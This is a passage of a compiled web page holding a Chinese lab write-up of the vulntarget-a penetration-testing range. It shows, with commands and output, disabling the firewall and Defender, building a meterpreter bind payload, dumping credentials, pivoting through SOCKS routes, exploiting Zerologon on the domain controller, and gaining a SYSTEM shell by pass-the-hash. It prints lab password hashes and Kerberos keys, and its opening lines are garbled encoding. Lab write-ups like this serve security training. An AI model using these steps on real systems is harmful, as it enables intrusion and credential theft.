4096\n\u05e8\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\u0237\ufffd\ufffd\ufffd\ufffd\n\nC:\\phpStudy\\PHPTutorial\\WWW> netsh advfirewall set allprofiles state off\n\u0237\ufffd\ufffd\ufffd\ufffd\n\nC:\\phpStudy\\PHPTutorial\\WWW> gpupdate /force\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7136\u540e\u57fa\u4e8e\u5f53\u524d ",(0,a.jsx)(n.code,{children:"nt authority\\system"})," \u7684\u7528\u6237\u6743\u9650\uff0c\u76f4\u63a5\u6ce8\u518c\u8868\u5173\u95ed ",(0,a.jsx)(n.code,{children:"Defender"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'C:\\phpStudy\\PHPTutorial\\WWW> REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n\u64cd\u4f5c\u6210\u529f\u5b8c\u6210\u3002\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5173\u95ed ",(0,a.jsx)(n.code,{children:"Defender"})," \u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u8681\u5251\u8fdb\u884c\u6587\u4ef6\u7ba1\u7406\u7b49\u64cd\u4f5c"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f46\u662f\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\uff0c\u53cd\u5411\u9a6c\u65e0\u6cd5\u8fde\u63a5\uff0c\u4e8e\u662f\u5c1d\u8bd5\u6784\u5efa\u6b63\u5411\u9a6c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=4444 -f exe > 4444.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 496 bytes\nFinal size of exe file: 7168 bytes\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(15729).A+"",width:"1853",height:"1095"})}),"\n",(0,a.jsx)(n.h2,{id:"\u57df\u4fe1\u606f\u6536\u96c6",children:"\u57df\u4fe1\u606f\u6536\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win7 192.168.200.10 | 10.0.20.98"',children:"meterpreter > arp\n\nARP cache\n=========\n\n    IP address       MAC address        Interface\n    ----------       -----------        ---------\n    10.0.20.99       00:0c:29:49:db:32  Intel(R) PRO/1000 MT Network Connection #2\n    10.0.20.255      ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection #2\n    192.168.200.0    00:50:56:eb:cc:78  Intel(R) PRO/1000 MT Network Connection\n    192.168.200.1    00:50:56:c0:00:00  Intel(R) PRO/1000 MT Network Connection\n    192.168.200.129  00:0c:29:07:06:1a  Intel(R) PRO/1000 MT Network Connection\n    192.168.200.254  00:50:56:fb:ab:25  Intel(R) PRO/1000 MT Network Connection\n    192.168.200.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection\n    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1\n    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection\n    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection #2\n    224.0.0.22       01:00:5e:00:00:16  Bluetooth \ufffd\ufffd\ufffd\ufffd(\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd)\n    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection\n    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection #2\n    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1\n    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Network Connection\n    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win2016 10.0.20.99 | 10.0.10.111"',children:"meterpreter > arp\n\nARP cache\n=========\n\n    IP address       MAC address        Interface\n    ----------       -----------        ---------\n    10.0.10.110      00:0c:29:96:86:43  Intel(R) 82574L Gigabit Network Connection #2\n    10.0.10.255      ff:ff:ff:ff:ff:ff  Intel(R) 82574L Gigabit Network Connection #2\n    10.0.20.1        00:50:56:c0:00:12  Intel(R) 82574L Gigabit Network Connection\n    10.0.20.98       00:0c:29:b3:db:12  Intel(R) 82574L Gigabit Network Connection\n    10.0.20.255      ff:ff:ff:ff:ff:ff  Intel(R) 82574L Gigabit Network Connection\n    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1\n    224.0.0.22       01:00:5e:00:00:16  Intel(R) 82574L Gigabit Network Connection\n    224.0.0.22       01:00:5e:00:00:16  Intel(R) 82574L Gigabit Network Connection #2\n    224.0.0.252      01:00:5e:00:00:fc  Intel(R) 82574L Gigabit Network Connection\n    224.0.0.252      01:00:5e:00:00:fc  Intel(R) 82574L Gigabit Network Connection #2\n    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1\n    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) 82574L Gigabit Network Connection\n    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) 82574L Gigabit Network Connection #2\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728 ",(0,a.jsx)(n.code,{children:"win2016"})," \u4e0a\u63a2\u6d4b\u5230\u57df\u4fe1\u606f"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win2016 10.0.20.99 | 10.0.10.111"',children:"meterpreter > run post/windows/gather/enum_domain\n\n[+] Domain FQDN: vulntarget.com\n[+] Domain NetBIOS Name: VULNTARGET\n[+] Domain Controller: win2019.vulntarget.com (IP: 10.0.10.110)\n\nmeterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername       Domain      NTLM                              SHA1\n--------       ------      ----                              ----\nAdministrator  WIN2016     570a9a65db8fba761c1008a51d4c95ab  759e689a07a84246d0b202a80f5fd9e335ca5392\nWIN2016$       VULNTARGET  2b6d27b1fbbad9f1e6413f972dec61ef  59e545714c05fb9b1a65fb79374a7c3dbbed25cf\n\nwdigest credentials\n===================\n\nUsername       Domain      Password\n--------       ------      --------\n(null)         (null)      (null)\nAdministrator  WIN2016     (null)\nWIN2016$       VULNTARGET  (null)\n\nkerberos credentials\n====================\n\nUsername       Domain          Password\n--------       ------          --------\n(null)         (null)          (null)\nAdministrator  WIN2016         (null)\nWIN2016$       vulntarget.com  9f 4a d8 69 51 87 85 85 8f 09 7c 82 f2 18 39 f6 c9 0e 07 3c 47 dc 95 a6 31 a8 42 6d af 98 49 5f e8 53 1c 4c 57 a5 d5 71 c5 4c f2 28 f4 fd 52 70 ed 6f da 35 e7 82 fd 46 6e 53 a\n                               c ef b1 cf 71 a7 cc f2 ff 4d bc 08 0f ee f6 e1 ac a5 8f 4f b6 a7 ae 3e e0 44 d6 79 bc ee e9 ea a9 17 c4 d5 58 78 06 43 ca 6c 73 3c d2 30 07 20 1d 2e 12 96 34 a4 a3 b7 42 ba be\n                                1d 84 b4 5d 32 d9 cf 39 f0 3e a4 79 2d 00 8b 62 6a 6b f3 3e c8 f7 ad 78 be 51 04 7b 30 fe eb e5 12 af 14 49 cb 50 63 68 97 01 29 9b 6e 4d 02 1b 7f be 13 f1 ea 92 26 c6 65 f2\n                               0c fa 70 9f b3 42 ae 94 9b 0c 35 77 2c 4b 54 1d 81 3c dd 0f 5c 15 04 0f fd aa b1 e5 62 0a 74 ca 84 2f 80 92 c2 59 b4 af 02 99 bb eb 95 99 d3 1b 59 4c c8 6e bd 75 be 0c 9d f9 a\n                               1 30 3e 85 7c 49 86\nwin2016$       VULNTARGET.COM  (null)\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fd9\u4e0e ARP \u8868\u5f97\u5230\u7684\u4fe1\u606f\u543b\u5408"}),"\n",(0,a.jsx)(n.h2,{id:"\u5efa\u7acb\u4e8c\u5c42\u5185\u7f51\u4ee3\u7406",children:"\u5efa\u7acb\u4e8c\u5c42\u5185\u7f51\u4ee3\u7406"}),"\n",(0,a.jsx)(n.p,{children:"\u5728 Meterpreter \u4e2d\u6dfb\u52a0\u8def\u7531\uff0c\u5e76\u5efa\u7acb\u4ee3\u7406"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win2016 10.0.20.99 | 10.0.10.111"',children:"meterpreter > run post/multi/manage/autoroute\n\n[*] Running module against WIN2016\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.0.10.0/255.255.255.0 from host's routing table.\n[+] Route added to subnet 10.0.20.0/255.255.255.0 from host's routing table.\nmeterpreter > bg\nmsf6 exploit(multi/handler) > use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) > exploit\n[*] Auxiliary module running as background job 0.\n[*] Starting the SOCKS proxy server\n"})}),"\n",(0,a.jsx)(n.h2,{id:"win2019-\u4fa6\u5bdf",children:"win2019 \u4fa6\u5bdf"}),"\n",(0,a.jsxs)(n.p,{children:["\u626b\u63cf ",(0,a.jsx)(n.code,{children:"win2019"})," \u5f00\u653e\u7684\u7aef\u53e3"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.10.110\nstart infoscan\n10.0.10.110:139 open\n10.0.10.110:135 open\n10.0.10.110:445 open\n10.0.10.110:88 open\n[*] alive ports len is: 4\nstart vulscan\n[*] NetInfo\n[*]10.0.10.110\n   [->]win2019\n   [->]10.0.10.110\n[*] NetBios 10.0.10.110     [+] DC:VULNTARGET\\WIN2019\n\u5df2\u5b8c\u6210 4/4\n[*] \u626b\u63cf\u7ed3\u675f, \u8017\u65f6: 3.072107126s\n"})}),"\n",(0,a.jsxs)(n.admonition,{type:"warning",children:[(0,a.jsx)(n.p,{children:"\u8fd9\u91cc\u9047\u5230\u6bd4\u8f83\u5927\u7684\u95ee\u9898\uff0c\u5c31\u662f socks \u4ee3\u7406\u7684\u4e0d\u7a33\u5b9a\u95ee\u9898"}),(0,a.jsx)(n.p,{children:"\u4e2a\u4eba\u5efa\u8bae\uff0c\u76f4\u63a5\u4f7f\u7528 metasploit \u5168\u7a0b\u6253\u4e0b\u6765\uff0c\u4e0d\u8981\u4f7f\u7528\u5176\u4ed6\u96a7\u9053\u5de5\u5177"}),(0,a.jsxs)(n.p,{children:["\u5148\u5c06 ",(0,a.jsx)(n.code,{children:"win7"})," \u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"windows/x64/meterpreter/reverse_tcp"})," \u6301\u4e45\u5316"]}),(0,a.jsxs)(n.p,{children:["\u7136\u540e\u8fd0\u884c ",(0,a.jsx)(n.code,{children:"run post/multi/manage/autoroute"})," \u505a\u5185\u7f51\u8def\u7531"]}),(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"[*] Running module against WIN7-PC\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.0.20.0/255.255.255.0 from host's routing table.\n[+] Route added to subnet 192.168.200.0/255.255.255.0 from host's routing table.\n[+] Route added to subnet 169.254.0.0/255.255.0.0 from Bluetooth vc6.\n"})}),(0,a.jsxs)(n.p,{children:["\u7136\u540e\u76f4\u63a5\u8fde\u63a5 ",(0,a.jsx)(n.code,{children:"win2016"})," \u7684 ",(0,a.jsx)(n.code,{children:"windows/x64/meterpreter/bind_tcp"})," \u505a\u6301\u4e45\u5316\uff0c\u518d\u6267\u884c\u4e00\u6b21\u5185\u7f51\u8def\u7531"]}),(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"[*] Running module against WIN2016\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.0.10.0/255.255.255.0 from host's routing table.\n"})}),(0,a.jsx)(n.p,{children:"\u6700\u540e\u7684 sessions \u5e94\u8be5\u4f1a\u662f"}),(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"msf6 exploit(multi/handler) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                    Connection\n  --  ----  ----                     -----------                    ----------\n  1         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ WIN7-PC  192.168.200.129:3333 -> 192.168.200.10:50706 (192.168.200.10)\n  2         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ WIN2016  10.0.20.98:50730 -> 10.0.20.99:4444 via session 1 (10.0.20.99)\n"})})]}),"\n",(0,a.jsx)(n.h2,{id:"win2019-\u57df\u54c8\u5e0c\u6536\u96c6",children:"win2019 \u57df\u54c8\u5e0c\u6536\u96c6"}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528",(0,a.jsx)(n.a,{href:"https://github.com/dirkjanm/CVE-2020-1472",children:"dirkjanm/CVE-2020-1472: PoC for Zerologon - all research credits go to Tom Tervoort of Secura"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nPerforming authentication attempts...\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49674  ...  OK\n==========================================================================================================================================================================================================================================================================\nTarget vulnerable, changing account password to empty string\n\nResult: 0\n\nExploit complete!\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u66f4\u6539\u8d26\u6237\u5bc6\u7801\u4e4b\u540e\uff0c\u83b7\u53d6\u57df\u54c8\u5e0c\u4fe1\u606f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ proxychains -q impacket-secretsdump vulntarget.com/WIN2019\\$@10.0.10.110 -no-pass\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::\nvulntarget.com\\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::\nWIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:2b6d27b1fbbad9f1e6413f972dec61ef:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d\nAdministrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1\nAdministrator:des-cbc-md5:dcc29476a789ec9e\nkrbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311\nkrbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded\nkrbtgt:des-cbc-md5:10efae67c7026dbf\nvulntarget.com\\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61\nvulntarget.com\\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855\nvulntarget.com\\win2016:des-cbc-md5:6e2901311c32ae58\nWIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390\nWIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25\nWIN2019$:des-cbc-md5:01c8894f541023bc\nWIN2016$:aes256-cts-hmac-sha1-96:70d999981306f90f6570a7cf59f3e1189e7ba84a9bced5b4e9843b4ebd5149b5\nWIN2016$:aes128-cts-hmac-sha1-96:3490377bc717cc13f3075a1ca7cf4ba0\nWIN2016$:des-cbc-md5:863d8f7c9846c8fe\n[*] Cleaning up... \n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230\u57df\u54c8\u5e0c\u4fe1\u606f\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u62ff\u4e0bDC\u7684Administrator"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 Administrator@10.0.10.110 -codec gbk\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32>whoami\nnt authority\\system\n"})}),"\n",(0,a.jsx)(n.h2,{id:"reference",children:"Reference"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://xz.aliyun.com/t/12422?time__1311=GqGxRQ0%3DEx9DlrzG7bGOYD8jEQAKqwod3x",children:"\u6e17\u900f\u9776\u573a - vulntarget-a \u7efc\u5408\u9776\u573a - \u5148\u77e5\u793e\u533a"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},28555:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241012-231250-e16d42884bfb48a7858efee88201564a.png"},63421:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241027-222704-208fe069ea4445bfea6fed3a4121aeb5.png"},92909:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241030-223013-0dbfbc5d1ba9eb4149d599c5bb8cd77a.png"},37503:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241032-223242-1da79ed8b99ddb2f72db7f279851fe14.png"},18807:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241033-223317-4dfdfa98325efac332eb3f0f2e4defe6.png"},32730:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241038-223825-89c3e8a860d19bef904cc694c087868e.png"},53300:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241039-213939-471c9f6948d3fa48541a6f4039634af1.png"},30069:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241040-224006-0272bbc415b75ee146009f32f80a59c2.png"},18118:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241100-000051-e3b872c49336de91aad6c1aa2e102c97.png"},71816:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241101-000119-1018e76c9f57565e4d77c1518ad1187c.png"},15729:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241124-112410-5f142cad7482e6291f43265f839e2e97.png"},52577:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241142-104202-266c03280c651df520a63d20058fb2e0.png"},6869:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20241144-104437-1e716972a44d6b67b8ec543dcbd2cf81.png"},28453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>l});var i=s(96540);const a={},t=i.createContext(a);function c(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);